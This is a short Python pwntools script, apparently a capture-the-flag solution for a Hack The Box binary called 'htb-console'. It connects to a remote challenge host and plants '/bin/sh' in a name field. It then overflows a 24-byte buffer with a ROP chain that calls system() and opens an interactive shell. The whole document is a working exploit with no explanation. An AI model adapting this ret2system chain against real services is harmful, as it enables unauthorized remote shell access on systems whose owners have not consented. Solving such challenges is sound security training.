#!/usr/bin/python3
from pwn import *

#shell = process("./htb-console")
shell = remote("94.237.52.120", 50916)
#shell = gdb.debug("./htb-console", "continue")

offset = 24
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x401473) # pop rdi; ret;
payload += p64(0x4040b0) # "/bin/sh"
payload += p64(0x401040) # system()

shell.sendlineafter(b">> ", b"hof")
shell.sendlineafter(b"name: ", b"/bin/sh\x00")
shell.sendlineafter(b">> ", b"flag")
shell.sendlineafter(b"flag: ", payload)

shell.interactive()
